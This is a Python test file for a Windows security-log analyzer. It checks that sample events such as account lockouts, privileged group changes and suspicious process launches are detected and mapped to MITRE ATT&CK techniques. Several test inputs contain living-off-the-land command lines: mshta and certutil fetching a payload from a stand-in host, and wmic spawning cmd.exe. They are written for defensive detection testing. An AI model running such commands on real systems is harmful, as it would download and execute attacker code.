from app.services.analyzer import analyze_log


def get_finding(result: dict, finding_type: str) -> dict:
    return next(
        finding
        for finding in result["findings"]
        if finding["type"] == finding_type
    )


def finding_types(result: dict) -> set[str]:
    return {
        finding["type"]
        for finding in result["findings"]
    }


def test_account_lockout_event_is_detected():
    result = analyze_log(
        "Event ID: 4740 A user account was locked out "
        "Account Name: alice "
        "Caller Computer Name: WORKSTATION-7"
    )

    finding = get_finding(result, "Account Lockout")

    assert finding["count"] == 1
    assert finding["severity"] == "Medium"
    assert finding["mitre_attack"] == "T1110 - Brute Force"
    assert result["risk_score"] == 30
    assert result["risk_level"] == "Medium"


def test_user_account_creation_is_detected():
    result = analyze_log(
        "Event ID: 4720 A user account was created "
        "Account Name: svc_backup"
    )

    finding = get_finding(result, "User Account Created")

    assert finding["count"] == 1
    assert finding["severity"] == "Medium"
    assert finding["mitre_attack"] == "T1136 - Create Account"
    assert result["risk_score"] == 30


def test_privileged_group_membership_change_is_detected():
    result = analyze_log(
        "Event ID: 4732 A member was added to a "
        "security-enabled local group "
        "Group Name: Administrators "
        "Member Name: CONTOSO\\alice"
    )

    finding = get_finding(
        result,
        "Privileged Group Membership Change",
    )

    assert finding["count"] == 1
    assert finding["severity"] == "High"
    assert finding["mitre_attack"] == (
        "T1098.007 - Additional Local or Domain Groups"
    )
    assert result["risk_score"] == 40
    assert (
        "Administrator Account Activity"
        not in finding_types(result)
    )


def test_non_privileged_group_change_is_not_escalated():
    result = analyze_log(
        "Event ID: 4732 A member was added to a "
        "security-enabled local group "
        "Group Name: Marketing "
        "Member Name: CONTOSO\\alice"
    )

    assert (
        "Privileged Group Membership Change"
        not in finding_types(result)
    )


def test_special_privileges_ignore_builtin_system_account():
    result = analyze_log(
        """
        Event ID: 4672 Special privileges assigned to new logon
        Account Name: SYSTEM
        Event ID: 4672 Special privileges assigned to new logon
        Account Name: alice
        """
    )

    finding = get_finding(
        result,
        "Special Privileges Assigned",
    )

    assert finding["count"] == 1
    assert finding["severity"] == "Low"
    assert result["risk_score"] == 10


def test_suspicious_mshta_process_creation_is_detected():
    result = analyze_log(
        "Event ID: 4688 A new process has been created "
        "New Process Name: C:\\Windows\\System32\\mshta.exe "
        "Command Line: mshta.exe https://example.invalid/payload.hta"
    )

    finding = get_finding(
        result,
        "Suspicious Mshta Execution",
    )

    assert finding["count"] == 1
    assert finding["severity"] == "High"
    assert finding["mitre_attack"] == "T1218.005 - Mshta"
    assert result["risk_score"] == 40


def test_suspicious_certutil_transfer_is_detected():
    result = analyze_log(
        "Event ID: 4688 A new process has been created "
        "New Process Name: C:\\Windows\\System32\\certutil.exe "
        "Command Line: certutil.exe -urlcache -split -f "
        "https://example.invalid/tool.exe C:\\Temp\\tool.exe"
    )

    finding = get_finding(
        result,
        "Suspicious Certutil Activity",
    )

    assert finding["count"] == 1
    assert finding["severity"] == "High"
    assert finding["mitre_attack"] == (
        "T1105 - Ingress Tool Transfer"
    )
    assert result["risk_score"] == 40


def test_suspicious_wmic_process_creation_is_detected():
    result = analyze_log(
        "Event ID: 4688 A new process has been created "
        "New Process Name: C:\\Windows\\System32\\wbem\\WMIC.exe "
        'Command Line: wmic process call create "cmd.exe /c whoami"'
    )

    finding = get_finding(
        result,
        "Suspicious WMI Process Creation",
    )

    assert finding["count"] == 1
    assert finding["severity"] == "High"
    assert finding["mitre_attack"] == (
        "T1047 - Windows Management Instrumentation"
    )
    assert result["risk_score"] == 35


def test_benign_process_creation_is_not_flagged():
    result = analyze_log(
        "Event ID: 4688 A new process has been created "
        "New Process Name: C:\\Windows\\System32\\notepad.exe "
        "Command Line: notepad.exe C:\\Users\\alice\\notes.txt"
    )

    assert (
        "Suspicious Mshta Execution"
        not in finding_types(result)
    )
    assert (
        "Suspicious Certutil Activity"
        not in finding_types(result)
    )
    assert (
        "Suspicious WMI Process Creation"
        not in finding_types(result)
    )
